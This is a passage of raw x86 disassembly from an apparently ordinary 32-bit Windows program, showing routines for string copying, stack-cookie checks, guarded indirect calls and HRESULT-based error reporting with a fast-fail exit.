  404118:	cmp    eax,0x2
  40411b:	jle    0x40414d
  40411d:	mov    BYTE PTR [ebx],0x5c
  404120:	inc    ebx
  404121:	mov    ecx,DWORD PTR [edx+0x4]
  404124:	lea    esi,[ecx+0x1]
  404127:	mov    al,BYTE PTR [ecx]
  404129:	inc    ecx
  40412a:	test   al,al
  40412c:	jne    0x404127
  40412e:	sub    ecx,esi
  404130:	sub    edi,ebx
  404132:	lea    esi,[ecx+0x1]
  404135:	cmp    esi,edi
  404137:	jb     0x40413b
  404139:	mov    esi,edi
  40413b:	push   esi
  40413c:	push   DWORD PTR [edx+0x4]
  40413f:	push   ebx
  404140:	call   0x4072a0
  404145:	add    esp,0xc
  404148:	mov    BYTE PTR [esi+ebx*1-0x1],0x0
  40414d:	mov    al,0x1
  40414f:	pop    edi
  404150:	pop    esi
  404151:	pop    ebx
  404152:	mov    esp,ebp
  404154:	pop    ebp
  404155:	ret    0x8
  404158:	int3   
  404159:	int3   
  40415a:	int3   
  40415b:	int3   
  40415c:	int3   
  40415d:	mov    edi,edi
  40415f:	push   ebp
  404160:	mov    ebp,esp
  404162:	sub    esp,0x10
  404165:	mov    eax,ds:0x408004
  40416a:	xor    eax,ebp
  40416c:	mov    DWORD PTR [ebp-0x4],eax
  40416f:	push   ebx
  404170:	push   esi
  404171:	push   edi
  404172:	mov    edi,edx
  404174:	mov    DWORD PTR [ebp-0x8],ecx
  404177:	xor    ebx,ebx
  404179:	push   ebx
  40417a:	mov    BYTE PTR [ebp-0x10],bl
  40417d:	mov    BYTE PTR [edi],bl
  40417f:	call   0x405e1d
  404184:	mov    esi,eax
  404186:	test   esi,esi
  404188:	je     0x4041d6
  40418a:	cmp    DWORD PTR [esi],ebx
  40418c:	je     0x4041d6
  40418e:	push   DWORD PTR [ebp+0x8]
  404191:	mov    ecx,DWORD PTR [ebp-0x8]
  404194:	mov    BYTE PTR [edi],bl
  404196:	mov    edx,DWORD PTR [esi]
  404198:	push   edi
  404199:	call   0x4040a0
  40419e:	mov    ecx,DWORD PTR [ebp-0x8]
  4041a1:	test   al,al
  4041a3:	je     0x4041a8
  4041a5:	mov    DWORD PTR [ecx+0x28],edi
  4041a8:	mov    eax,DWORD PTR [esi]
  4041aa:	mov    DWORD PTR [ebp-0xc],eax
  4041ad:	mov    edi,DWORD PTR [eax+0x4]
  4041b0:	push   ecx
  4041b1:	mov    eax,DWORD PTR [edi]
  4041b3:	mov    esi,DWORD PTR [eax]
  4041b5:	mov    ecx,esi
  4041b7:	call   DWORD PTR ds:0x409210
  4041bd:	mov    ecx,edi
  4041bf:	call   esi
  4041c1:	mov    ecx,DWORD PTR [ebp-0x8]
  4041c4:	or     bl,al
  4041c6:	mov    eax,DWORD PTR [ebp-0xc]
  4041c9:	mov    BYTE PTR [ebp-0x10],bl
  4041cc:	mov    eax,DWORD PTR [eax+0x8]
  4041cf:	mov    DWORD PTR [ebp-0xc],eax
  4041d2:	test   eax,eax
  4041d4:	jne    0x4041ad
  4041d6:	mov    esi,DWORD PTR ds:0x4083f0
  4041dc:	test   esi,esi
  4041de:	je     0x4041f0
  4041e0:	push   DWORD PTR [ebp-0x8]
  4041e3:	mov    ecx,esi
  4041e5:	push   DWORD PTR [ebp-0x10]
  4041e8:	call   DWORD PTR ds:0x409210
  4041ee:	call   esi
  4041f0:	mov    ecx,DWORD PTR [ebp-0x4]
  4041f3:	pop    edi
  4041f4:	pop    esi
  4041f5:	xor    ecx,ebp
  4041f7:	pop    ebx
  4041f8:	call   0x406b70
  4041fd:	mov    esp,ebp
  4041ff:	pop    ebp
  404200:	ret    0x4
  404203:	int3   
  404204:	int3   
  404205:	int3   
  404206:	int3   
  404207:	int3   
  404208:	mov    edi,edi
  40420a:	push   ebp
  40420b:	mov    ebp,esp
  40420d:	push   ecx
  40420e:	push   ecx
  40420f:	push   ebx
  404210:	mov    ebx,DWORD PTR [ebp+0x8]
  404213:	mov    eax,ecx
  404215:	push   esi
  404216:	push   edi
  404217:	push   0x14
  404219:	pop    ecx
  40421a:	mov    edi,eax
  40421c:	mov    DWORD PTR [ebp-0x4],eax
  40421f:	mov    esi,ebx
  404221:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404223:	mov    ecx,DWORD PTR [ebx+0x40]
  404226:	call   0x403fea
  40422b:	mov    ecx,DWORD PTR [ebx+0x34]
  40422e:	mov    esi,eax
  404230:	call   0x403fea
  404235:	mov    ecx,DWORD PTR [ebx+0xc]
  404238:	add    esi,eax
  40423a:	call   0x403fea
  40423f:	mov    ecx,DWORD PTR [ebx+0x3c]
  404242:	add    esi,eax
  404244:	call   0x403fcd
  404249:	mov    ecx,DWORD PTR [ebx+0x30]
  40424c:	add    esi,eax
  40424e:	call   0x403fcd
  404253:	mov    ecx,DWORD PTR [ebx+0x28]
  404256:	add    esi,eax
  404258:	call   0x403fcd
  40425d:	mov    ecx,DWORD PTR [ebx+0x1c]
  404260:	add    esi,eax
  404262:	call   0x403fcd
  404267:	mov    ecx,DWORD PTR [ebx+0x18]
  40426a:	add    esi,eax
  40426c:	call   0x403fcd
  404271:	mov    ecx,DWORD PTR [ebx+0x14]
  404274:	add    esi,eax
  404276:	call   0x403fcd
  40427b:	mov    ecx,DWORD PTR [ebx+0x44]
  40427e:	add    esi,eax
  404280:	call   0x403fcd
  404285:	add    esi,eax
  404287:	xor    ecx,ecx
  404289:	mov    eax,DWORD PTR [ebp-0x4]
  40428c:	lea    edi,[eax+0x50]
  40428f:	mov    edx,DWORD PTR [edi]
  404291:	test   edx,edx
  404293:	je     0x40429f
  404295:	cmp    DWORD PTR [edx],0x1
  404298:	jne    0x40429f
  40429a:	cmp    DWORD PTR [eax+0x54],esi
  40429d:	jae    0x4042dc
  40429f:	mov    ecx,edi
  4042a1:	call   0x403d61
  4042a6:	test   esi,esi
  4042a8:	jne    0x4042b3
  4042aa:	mov    ecx,edi
  4042ac:	call   0x403d61
  4042b1:	jmp    0x4042da
  4042b3:	lea    eax,[esi+0x4]
  4042b6:	push   eax
  4042b7:	call   DWORD PTR ds:0x4091f4
  4042bd:	mov    DWORD PTR [ebp-0x8],eax
  4042c0:	pop    ecx
  4042c1:	test   eax,eax
  4042c3:	je     0x4042da
  4042c5:	and    DWORD PTR [eax],0x0
  4042c8:	mov    ecx,edi
  4042ca:	call   0x403d61
  4042cf:	mov    eax,DWORD PTR [ebp-0x8]
  4042d2:	mov    DWORD PTR [edi],eax
  4042d4:	mov    DWORD PTR [edi+0x4],esi
  4042d7:	lock inc DWORD PTR [eax]
  4042da:	xor    ecx,ecx
  4042dc:	mov    eax,DWORD PTR [edi]
  4042de:	mov    edx,DWORD PTR [edi+0x4]
  4042e1:	test   eax,eax
  4042e3:	je     0x4042e8
  4042e5:	lea    ecx,[eax+0x4]
  4042e8:	mov    edi,DWORD PTR [ebp-0x4]
  4042eb:	lea    eax,[edx+ecx*1]
  4042ee:	mov    esi,ecx
  4042f0:	neg    esi
  4042f2:	sbb    esi,esi
  4042f4:	and    esi,eax
  4042f6:	lea    eax,[edi+0xc]
  4042f9:	push   eax
  4042fa:	push   DWORD PTR [ebx+0xc]
  4042fd:	mov    edx,esi
  4042ff:	call   0x406653
  404304:	lea    ecx,[edi+0x14]
  404307:	mov    edx,esi
  404309:	push   ecx
  40430a:	push   DWORD PTR [ebx+0x14]
  40430d:	mov    ecx,eax
  40430f:	call   0x4066c8
  404314:	lea    ecx,[edi+0x18]
  404317:	mov    edx,esi
  404319:	push   ecx
  40431a:	push   DWORD PTR [ebx+0x18]
  40431d:	mov    ecx,eax
  40431f:	call   0x4066c8
  404324:	lea    ecx,[edi+0x1c]
  404327:	mov    edx,esi
  404329:	push   ecx
  40432a:	push   DWORD PTR [ebx+0x1c]
  40432d:	mov    ecx,eax
  40432f:	call   0x4066c8
  404334:	lea    ecx,[edi+0x28]
  404337:	mov    edx,esi
  404339:	push   ecx
  40433a:	push   DWORD PTR [ebx+0x28]
  40433d:	mov    ecx,eax
  40433f:	call   0x4066c8
  404344:	lea    ecx,[edi+0x44]
  404347:	mov    edx,esi
  404349:	push   ecx
  40434a:	push   DWORD PTR [ebx+0x44]
  40434d:	mov    ecx,eax
  40434f:	call   0x4066c8
  404354:	lea    ecx,[edi+0x3c]
  404357:	mov    edx,esi
  404359:	push   ecx
  40435a:	push   DWORD PTR [ebx+0x3c]
  40435d:	mov    ecx,eax
  40435f:	call   0x4066c8
  404364:	lea    ecx,[edi+0x40]
  404367:	mov    edx,esi
  404369:	push   ecx
  40436a:	push   DWORD PTR [ebx+0x40]
  40436d:	mov    ecx,eax
  40436f:	call   0x406653
  404374:	lea    ecx,[edi+0x30]
  404377:	mov    edx,esi
  404379:	push   ecx
  40437a:	push   DWORD PTR [ebx+0x30]
  40437d:	mov    ecx,eax
  40437f:	call   0x4066c8
  404384:	lea    ecx,[edi+0x34]
  404387:	mov    edx,esi
  404389:	push   ecx
  40438a:	push   DWORD PTR [ebx+0x34]
  40438d:	mov    ecx,eax
  40438f:	call   0x406653
  404394:	pop    edi
  404395:	pop    esi
  404396:	pop    ebx
  404397:	mov    esp,ebp
  404399:	pop    ebp
  40439a:	ret    0x4
  40439d:	int3   
  40439e:	int3   
  40439f:	int3   
  4043a0:	int3   
  4043a1:	int3   
  4043a2:	mov    edi,edi
  4043a4:	push   ebp
  4043a5:	mov    ebp,esp
  4043a7:	push   esi
  4043a8:	push   DWORD PTR [ebp+0x8]
  4043ab:	mov    esi,ecx
  4043ad:	and    DWORD PTR [esi+0x50],0x0
  4043b1:	and    DWORD PTR [esi+0x54],0x0
  4043b5:	call   0x404208
  4043ba:	mov    eax,esi
  4043bc:	pop    esi
  4043bd:	pop    ebp
  4043be:	ret    0x4
  4043c1:	int3   
  4043c2:	int3   
  4043c3:	int3   
  4043c4:	int3   
  4043c5:	int3   
  4043c6:	mov    edi,edi
  4043c8:	push   ebp
  4043c9:	mov    ebp,esp
  4043cb:	sub    esp,0x10
  4043ce:	mov    eax,ds:0x408004
  4043d3:	xor    eax,ebp
  4043d5:	mov    DWORD PTR [ebp-0x4],eax
  4043d8:	mov    eax,DWORD PTR [ebp+0x28]
  4043db:	push   ebx
  4043dc:	push   esi
  4043dd:	xor    esi,esi
  4043df:	mov    DWORD PTR [ebp-0xc],edx
  4043e2:	mov    WORD PTR [eax],si
  4043e5:	xor    ebx,ebx
  4043e7:	mov    eax,DWORD PTR [ebp+0x30]
  4043ea:	mov    DWORD PTR [ebp-0x8],ebx
  4043ed:	push   edi
  4043ee:	mov    edi,DWORD PTR [ebp+0x1c]
  4043f1:	mov    BYTE PTR [eax],bl
  4043f3:	mov    ebx,DWORD PTR [ebp+0x18]
  4043f6:	mov    eax,ebx
  4043f8:	mov    DWORD PTR [ebp-0x10],ecx
  4043fb:	sub    eax,esi
  4043fd:	je     0x404453
  4043ff:	sub    eax,0x1
  404402:	je     0x40444a
  404404:	sub    eax,0x1
  404407:	je     0x404441
  404409:	sub    eax,0x1
  40440c:	je     0x40441b
  40440e:	sub    eax,0x1
  404411:	jne    0x40445d
  404413:	push   edi
  404414:	call   0x403df0
  404419:	jmp    0x40445a
  40441b:	test   edi,edi
  40441d:	js     0x404438
  40441f:	mov    edi,0x8007029c
  404424:	push   edi
  404425:	push   0x3
  404427:	push   DWORD PTR [ebp+0x14]
  40442a:	push   DWORD PTR [ebp+0x10]
  40442d:	push   DWORD PTR [ebp+0xc]
  404430:	push   DWORD PTR [ebp+0x8]
  404433:	call   0x404720
  404438:	mov    ecx,edi
  40443a:	call   0x403dd4
  40443f:	jmp    0x40445a
  404441:	mov    ecx,edi
  404443:	call   0x403dbc
  404448:	jmp    0x40445a
  40444a:	mov    ecx,edi
  40444c:	call   0x403da4
  404451:	jmp    0x40445a
  404453:	mov    ecx,edi
  404455:	call   0x403d8c
  40445a:	mov    DWORD PTR [ebp-0x8],eax
  40445d:	mov    esi,DWORD PTR [ebp+0x38]
  404460:	mov    DWORD PTR [esi],ebx
  404462:	xor    ebx,ebx
  404464:	inc    ebx
  404465:	mov    DWORD PTR [esi+0x4],edi
  404468:	mov    eax,ebx
  40446a:	lock xadd DWORD PTR ds:0x4083d4,eax
  404472:	inc    eax
  404473:	mov    DWORD PTR [esi+0x8],eax
  404476:	mov    eax,DWORD PTR [ebp+0x20]
  404479:	test   eax,eax
  40447b:	je     0x404484
  40447d:	xor    ecx,ecx
  40447f:	cmp    WORD PTR [eax],cx
  404482:	jne    0x404486
  404484:	xor    eax,eax
  404486:	mov    DWORD PTR [esi+0xc],eax
  404489:	call   DWORD PTR ds:0x4090a4
  40448f:	mov    edi,DWORD PTR ds:0x408400
  404495:	mov    DWORD PTR [esi+0x10],eax
  404498:	mov    eax,DWORD PTR [ebp+0x8]
  40449b:	mov    DWORD PTR [esi+0x1c],eax
  40449e:	mov    eax,DWORD PTR [ebp-0xc]
  4044a1:	mov    DWORD PTR [esi+0x20],eax
  4044a4:	mov    eax,DWORD PTR [ebp-0x8]
  4044a7:	mov    DWORD PTR [esi+0x24],eax
  4044aa:	mov    eax,DWORD PTR [ebp+0x10]
  4044ad:	mov    DWORD PTR [esi+0x14],eax
  4044b0:	mov    eax,DWORD PTR [ebp+0xc]
  4044b3:	mov    DWORD PTR [esi+0x18],eax
  4044b6:	mov    eax,DWORD PTR [ebp+0x14]
  4044b9:	mov    DWORD PTR [esi+0x48],eax
  4044bc:	mov    eax,DWORD PTR [ebp-0x10]
  4044bf:	mov    DWORD PTR [esi+0x4c],eax
  4044c2:	xor    eax,eax
  4044c4:	mov    DWORD PTR [esi+0x28],eax
  4044c7:	mov    DWORD PTR [esi+0x38],eax
  4044ca:	mov    DWORD PTR [esi+0x3c],eax
  4044cd:	mov    DWORD PTR [esi+0x40],eax
  4044d0:	mov    DWORD PTR [esi+0x2c],eax
  4044d3:	mov    DWORD PTR [esi+0x30],eax
  4044d6:	mov    DWORD PTR [esi+0x34],eax
  4044d9:	test   edi,edi
  4044db:	je     0x4044e7
  4044dd:	mov    ecx,edi
  4044df:	call   DWORD PTR ds:0x409210
  4044e5:	call   edi
  4044e7:	mov    edx,DWORD PTR [ebp+0x30]
  4044ea:	mov    ecx,esi
  4044ec:	push   0x400
  4044f1:	mov    DWORD PTR [esi+0x44],eax
  4044f4:	call   0x40415d
  4044f9:	mov    edi,DWORD PTR ds:0x4083ec
  4044ff:	test   edi,edi
  404501:	je     0x40450e
  404503:	push   esi
  404504:	mov    ecx,edi
  404506:	call   DWORD PTR ds:0x409210
  40450c:	call   edi
  40450e:	xor    eax,eax
  404510:	cmp    DWORD PTR [esi+0x4],eax
  404513:	jl     0x40451f
  404515:	cmp    DWORD PTR [ebp+0x18],0x4
  404519:	jne    0x4045ae
  40451f:	mov    edi,DWORD PTR ds:0x408408
  404525:	cmp    BYTE PTR ds:0x408405,al
  40452b:	jne    0x40453b
  40452d:	cmp    DWORD PTR ds:0x4083f0,eax
  404533:	jne    0x404539
  404535:	test   edi,edi
  404537:	je     0x40453b
  404539:	mov    bl,al
  40453b:	cmp    BYTE PTR [ebp+0x24],al
  40453e:	jne    0x40455f
  404540:	test   bl,bl
  404542:	jne    0x40455f
  404544:	test   edi,edi
  404546:	je     0x40459b
  404548:	cmp    BYTE PTR ds:0x408404,al
  40454e:	jne    0x40459b
  404550:	push   eax
  404551:	push   eax
  404552:	push   esi
  404553:	mov    ecx,edi
  404555:	call   DWORD PTR ds:0x409210
  40455b:	call   edi
  40455d:	jmp    0x40459b
  40455f:	test   edi,edi
  404561:	je     0x404576
  404563:	push   0x800
  404568:	push   DWORD PTR [ebp+0x28]
  40456b:	mov    ecx,edi
  40456d:	push   esi
  40456e:	call   DWORD PTR ds:0x409210
  404574:	call   edi
  404576:	mov    eax,DWORD PTR [ebp+0x28]
  404579:	xor    ecx,ecx
  40457b:	cmp    WORD PTR [eax],cx
  40457e:	jne    0x404590
  404580:	push   esi
  404581:	mov    edx,0x800
  404586:	mov    ecx,eax
  404588:	call   0x403b96
  40458d:	mov    eax,DWORD PTR [ebp+0x28]
  404590:	test   bl,bl
  404592:	je     0x40459b
  404594:	push   eax
  404595:	call   DWORD PTR ds:0x40908c
  40459b:	mov    ecx,DWORD PTR [ebp-0x4]
  40459e:	pop    edi
  40459f:	pop    esi
  4045a0:	xor    ecx,ebp
  4045a2:	pop    ebx
  4045a3:	call   0x406b70
  4045a8:	mov    esp,ebp
  4045aa:	pop    ebp
  4045ab:	ret    0x34
  4045ae:	mov    ecx,DWORD PTR [ebp+0x4]
  4045b1:	mov    edx,0xb46
  4045b6:	push   0x401584
  4045bb:	call   0x4047a3
  4045c0:	int3   
  4045c1:	int3   
  4045c2:	int3   
  4045c3:	int3   
  4045c4:	int3   
  4045c5:	int3   
  4045c6:	mov    edi,edi
  4045c8:	push   ebp
  4045c9:	mov    ebp,esp
  4045cb:	mov    eax,0x14c4
  4045d0:	call   0x407270
  4045d5:	mov    eax,ds:0x408004
  4045da:	xor    eax,ebp
  4045dc:	mov    DWORD PTR [ebp-0x4],eax
  4045df:	mov    eax,DWORD PTR [ebp+0x8]
  4045e2:	push   ebx
  4045e3:	mov    ebx,DWORD PTR [ebp+0x10]
  4045e6:	push   esi
  4045e7:	mov    esi,DWORD PTR [ebp+0x18]
  4045ea:	mov    DWORD PTR [ebp-0x1410],ebx
  4045f0:	mov    ebx,DWORD PTR [ebp+0x14]
  4045f3:	mov    DWORD PTR [ebp-0x1414],ebx
  4045f9:	push   edi
  4045fa:	mov    edi,DWORD PTR [ebp+0xc]
  4045fd:	test   esi,esi
  4045ff:	jne    0x40460d
  404601:	cmp    DWORD PTR ds:0x4083f4,esi
  404607:	je     0x40460d
  404609:	mov    bl,0x1
  40460b:	jmp    0x40460f
  40460d:	xor    bl,bl
  40460f:	lea    esi,[ebp-0x1468]
  404615:	mov    BYTE PTR [ebp-0x140c],bl
  40461b:	push   esi
  40461c:	push   ecx
  40461d:	lea    esi,[ebp-0x1408]
  404623:	push   esi
  404624:	push   ecx
  404625:	lea    esi,[ebp-0x1008]
  40462b:	push   esi
  40462c:	push   DWORD PTR [ebp-0x140c]
  404632:	mov    esi,DWORD PTR [ebp+0x18]
  404635:	push   0x0
  404637:	push   DWORD PTR [ebp+0x1c]
  40463a:	push   esi
  40463b:	push   DWORD PTR [ebp-0x1414]
  404641:	push   DWORD PTR [ebp-0x1410]
  404647:	push   edi
  404648:	push   eax
  404649:	call   0x4043c6
  40464e:	cmp    esi,0x4
  404651:	jne    0x40466b
  404653:	push   0x7
  404655:	pop    ecx
  404656:	int    0x29
  404658:	mov    ecx,DWORD PTR [ebp-0x4]
  40465b:	pop    edi
  40465c:	pop    esi
  40465d:	xor    ecx,ebp
  40465f:	pop    ebx
  404660:	call   0x406b70
  404665:	mov    esp,ebp
  404667:	pop    ebp
  404668:	ret    0x20
  40466b:	test   esi,esi
  40466d:	jne    0x404658
  40466f:	test   bl,bl
  404671:	je     0x404691
  404673:	mov    esi,DWORD PTR ds:0x4083f4
  404679:	lea    eax,[ebp-0x1008]
  40467f:	push   eax
  404680:	lea    eax,[ebp-0x1468]
  404686:	mov    ecx,esi
  404688:	push   eax
  404689:	call   DWORD PTR ds:0x409210
  40468f:	call   esi
  404691:	lea    eax,[ebp-0x1468]
  404697:	push   eax
  404698:	lea    ecx,[ebp-0x14c0]
  40469e:	call   0x4043a2
  4046a3:	push   0x407448
  4046a8:	lea    eax,[ebp-0x14c0]
  4046ae:	push   eax
  4046af:	call   0x40725a
  4046b4:	int3   
  4046b5:	int3   
  4046b6:	int3   
  4046b7:	int3   
  4046b8:	int3   
  4046b9:	int3   
  4046ba:	int3   
  4046bb:	int3   
  4046bc:	int3   
  4046bd:	int3   
  4046be:	int3   
  4046bf:	int3   
  4046c0:	add    ecx,0x50
  4046c3:	jmp    0x403d61
  4046c8:	int3   
  4046c9:	int3   
  4046ca:	int3   
  4046cb:	int3   
  4046cc:	int3   
  4046cd:	int3   
  4046ce:	int3   
  4046cf:	int3   
  4046d0:	mov    edi,edi
  4046d2:	push   ebp
  4046d3:	mov    ebp,esp
  4046d5:	push   ecx
  4046d6:	mov    eax,DWORD PTR [ebp+0x8]
  4046d9:	push   ebx
  4046da:	push   esi
  4046db:	push   edi
  4046dc:	mov    ebx,ecx
  4046de:	mov    esi,eax
  4046e0:	push   0x14
  4046e2:	pop    ecx
  4046e3:	mov    edi,ebx
  4046e5:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4046e7:	lea    esi,[ebx+0x50]
  4046ea:	and    DWORD PTR [esi],0x0
  4046ed:	and    DWORD PTR [esi+0x4],0x0
  4046f1:	mov    ecx,DWORD PTR [eax+0x54]
  4046f4:	mov    edi,DWORD PTR [eax+0x50]
  4046f7:	mov    DWORD PTR [ebp-0x4],ecx
  4046fa:	mov    ecx,esi
  4046fc:	call   0x403d61
  404701:	test   edi,edi
  404703:	je     0x404710
  404705:	mov    eax,DWORD PTR [ebp-0x4]
  404708:	mov    DWORD PTR [esi],edi
  40470a:	mov    DWORD PTR [esi+0x4],eax
  40470d:	lock inc DWORD PTR [edi]
  404710:	pop    edi
  404711:	pop    esi
  404712:	mov    eax,ebx
  404714:	pop    ebx
  404715:	mov    esp,ebp
  404717:	pop    ebp
  404718:	ret    0x4
  40471b:	int3   
  40471c:	int3   
  40471d:	int3   
  40471e:	int3   
  40471f:	int3   
  404720:	mov    edi,edi
  404722:	push   ebp
  404723:	mov    ebp,esp
  404725:	and    esp,0xfffffff8
  404728:	push   ecx
  404729:	push   ecx
  40472a:	push   DWORD PTR [ebp+0x1c]
  40472d:	push   DWORD PTR [ebp+0x18]
  404730:	push   DWORD PTR [ebp+0x14]
  404733:	push   DWORD PTR [ebp+0x10]
  404736:	push   DWORD PTR [ebp+0xc]
  404739:	push   DWORD PTR [ebp+0x8]
  40473c:	call   0x4045c6
  404741:	mov    esp,ebp
  404743:	pop    ebp
  404744:	ret    0x18
  404747:	int3   
  404748:	int3   
  404749:	int3   
  40474a:	int3   
  40474b:	int3   
  40474c:	mov    edi,edi
  40474e:	push   ebp
  40474f:	mov    ebp,esp
  404751:	push   DWORD PTR [ebp+0xc]
  404754:	mov    edx,0x76d
  404759:	push   0x3
  40475b:	push   DWORD PTR [ebp+0x4]
  40475e:	push   0x0
  404760:	push   0x0
  404762:	push   0x401584
  404767:	call   0x404720
  40476c:	mov    eax,DWORD PTR [ebp+0xc]
  40476f:	pop    ebp
  404770:	ret    0x8
  404773:	int3   
  404774:	int3   
  404775:	int3   
  404776:	int3   
  404777:	int3   
  404778:	mov    edi,edi
  40477a:	push   ebp
  40477b:	mov    ebp,esp
  40477d:	push   0x8000ffff
  404782:	push   0x4
  404784:	push   DWORD PTR [ebp+0x4]
  404787:	mov    edx,0x759
  40478c:	push   0x0
  40478e:	push   0x0
  404790:	push   0x401584
  404795:	call   0x404720
  40479a:	pop    ebp
  40479b:	ret    0x4
  40479e:	int3   
  40479f:	int3   
  4047a0:	int3   
  4047a1:	int3   
  4047a2:	int3   
  4047a3:	mov    edi,edi
  4047a5:	push   ebp
  4047a6:	mov    ebp,esp
  4047a8:	push   0x8000ffff
  4047ad:	push   0x4
  4047af:	push   DWORD PTR [ebp+0x4]
  4047b2:	push   0x0
  4047b4:	push   0x0
  4047b6:	push   DWORD PTR [ebp+0x8]
  4047b9:	call   0x404720
  4047be:	pop    ebp
  4047bf:	ret    0x4
  4047c2:	int3   
  4047c3:	int3   
  4047c4:	int3   
  4047c5:	int3   
  4047c6:	int3   
  4047c7:	int3   
  4047c8:	int3   
  4047c9:	int3   
  4047ca:	int3   
  4047cb:	int3   
  4047cc:	int3   
  4047cd:	int3   
  4047ce:	int3   
  4047cf:	int3   
  4047d0:	ret    
  4047d1:	int3   
  4047d2:	int3   
  4047d3:	int3   
  4047d4:	int3   
  4047d5:	int3   
  4047d6:	int3   
  4047d7:	int3   
  4047d8:	int3   
  4047d9:	int3   
  4047da:	int3   
  4047db:	int3   
  4047dc:	int3   
  4047dd:	int3   
  4047de:	int3   
  4047df:	int3   
  4047e0:	mov    edi,edi
  4047e2:	push   ebp
  4047e3:	mov    ebp,esp
  4047e5:	and    esp,0xfffffff8
  4047e8:	cmp    BYTE PTR [ebp+0x8],0x0
  4047ec:	jne    0x40480c
  4047ee:	cmp    DWORD PTR [ecx+0xc],0x1
  4047f2:	jne    0x4047fe
  4047f4:	push   DWORD PTR [ebp+0xc]
  4047f7:	call   0x404844
  4047fc:	jmp    0x40480c
  4047fe:	cmp    DWORD PTR [ecx+0xc],0x2
  404802:	jne    0x40480c
  404804:	push   DWORD PTR [ebp+0xc]
  404807:	call   0x4049e3
  40480c:	mov    esp,ebp
  40480e:	pop    ebp
  40480f:	ret    0x8
  404812:	int3   
  404813:	int3   
  404814:	int3   
  404815:	int3   
  404816:	int3   
  404817:	cmp    BYTE PTR [ecx+0x8],0x0
  40481b:	mov    DWORD PTR [ecx],0x4010d4
  404821:	je     0x40483e
  404823:	push   esi
  404824:	mov    esi,DWORD PTR [ecx+0x4]
  404827:	push   DWORD PTR [esi+0x1c]
  40482a:	push   DWORD PTR [esi+0x18]
  40482d:	call   DWORD PTR ds:0x40901c
  404833:	xor    eax,eax
  404835:	mov    DWORD PTR [esi+0x18],eax
  404838:	mov    DWORD PTR [esi+0x1c],eax
  40483b:	mov    DWORD PTR [esi],eax
  40483d:	pop    esi
  40483e:	ret    
  40483f:	int3   
  404840:	int3   
  404841:	int3   
  404842:	int3   
  404843:	int3   
  404844:	mov    edi,edi
  404846:	push   ebp
  404847:	mov    ebp,esp
  404849:	sub    esp,0x120
  40484f:	mov    eax,ds:0x408004
  404854:	xor    eax,ebp
  404856:	mov    DWORD PTR [ebp-0x8],eax
  404859:	push   ebx
  40485a:	push   esi
  40485b:	mov    esi,DWORD PTR [ecx+0x4]
  40485e:	push   edi
  40485f:	mov    edi,DWORD PTR [ebp+0x8]
  404862:	cmp    DWORD PTR [esi],0x5
  404865:	jbe    0x4049cb
  40486b:	push   0x2000
  404870:	push   0x0
  404872:	mov    ecx,esi
  404874:	call   0x402718
  404879:	test   al,al
  40487b:	je     0x4049cb
  404881:	mov    eax,DWORD PTR [edi+0x4]
  404884:	lea    ecx,[ebp-0xdc]
  40488a:	mov    edx,DWORD PTR [edi+0x1c]
  40488d:	and    DWORD PTR [ebp-0xe8],0x0
  404894:	and    DWORD PTR [ebp-0xe0],0x0
  40489b:	push   0x4
  40489d:	mov    DWORD PTR [ebp-0x11c],eax
  4048a3:	lea    eax,[ebp-0x11c]
  4048a9:	pop    ebx
  4048aa:	mov    DWORD PTR [ebp-0xec],eax
  4048b0:	mov    DWORD PTR [ebp-0xe4],ebx
  4048b6:	call   0x402752
  4048bb:	mov    edx,DWORD PTR [edi+0x44]
  4048be:	lea    eax,[edi+0x20]
  4048c1:	and    DWORD PTR [ebp-0xc8],0x0
  4048c8:	lea    ecx,[ebp-0xbc]
  4048ce:	and    DWORD PTR [ebp-0xc0],0x0
  4048d5:	mov    DWORD PTR [ebp-0xcc],eax
  4048db:	mov    DWORD PTR [ebp-0xc4],ebx
  4048e1:	call   0x402752
  4048e6:	mov    eax,DWORD PTR [edi]
  4048e8:	lea    ecx,[ebp-0x9c]
  4048ee:	mov    edx,DWORD PTR [edi+0xc]
  4048f1:	and    DWORD PTR [ebp-0xa8],0x0
  4048f8:	and    DWORD PTR [ebp-0xa0],0x0
  4048ff:	mov    DWORD PTR [ebp-0x120],eax
  404905:	lea    eax,[ebp-0x120]
  40490b:	mov    DWORD PTR [ebp-0xac],eax
  404911:	mov    DWORD PTR [ebp-0xa4],ebx
  404917:	call   0x402789
  40491c:	mov    eax,DWORD PTR [edi+0x10]
  40491f:	lea    ecx,[ebp-0x7c]
  404922:	mov    edx,DWORD PTR [edi+0x28]
  404925:	and    DWORD PTR [ebp-0x88],0x0
  40492c:	and    DWORD PTR [ebp-0x80],0x0
  404930:	mov    DWORD PTR [ebp-0x110],eax
  404936:	lea    eax,[ebp-0x110]
  40493c:	mov    DWORD PTR [ebp-0x8c],eax
  404942:	mov    DWORD PTR [ebp-0x84],ebx
  404948:	call   0x402752
  40494d:	mov    eax,DWORD PTR [edi+0x2c]
  404950:	lea    ecx,[ebp-0x5c]
  404953:	mov    edx,DWORD PTR [edi+0x30]
  404956:	and    DWORD PTR [ebp-0x68],0x0
  40495a:	and    DWORD PTR [ebp-0x60],0x0
  40495e:	mov    DWORD PTR [ebp-0x114],eax
  404964:	lea    eax,[ebp-0x114]
  40496a:	mov    DWORD PTR [ebp-0x6c],eax
  40496d:	mov    DWORD PTR [ebp-0x64],ebx
  404970:	call   0x402752
  404975:	mov    edx,DWORD PTR [edi+0x34]
  404978:	lea    ecx,[ebp-0x4c]
  40497b:	call   0x402789
  404980:	mov    eax,DWORD PTR [edi+0x38]
  404983:	lea    ecx,[ebp-0x2c]
  404986:	mov    edx,DWORD PTR [edi+0x3c]
  404989:	and    DWORD PTR [ebp-0x38],0x0
  40498d:	mov    DWORD PTR [ebp-0x118],eax
  404993:	lea    eax,[ebp-0x118]
  404999:	mov    DWORD PTR [ebp-0x34],ebx
  40499c:	xor    ebx,ebx
  40499e:	mov    DWORD PTR [ebp-0x3c],eax
  4049a1:	mov    DWORD PTR [ebp-0x30],ebx
  4049a4:	call   0x402752
  4049a9:	mov    edx,DWORD PTR [edi+0x40]
  4049ac:	lea    ecx,[ebp-0x1c]
  4049af:	call   0x402789
  4049b4:	lea    eax,[ebp-0x10c]
  4049ba:	mov    edx,0x401aec
  4049bf:	push   eax
  4049c0:	push   0x10
  4049c2:	push   ebx
  4049c3:	push   ebx
  4049c4:	mov    ecx,esi
  4049c6:	call   0x402687
  4049cb:	mov    ecx,DWORD PTR [ebp-0x8]
  4049ce:	pop    edi
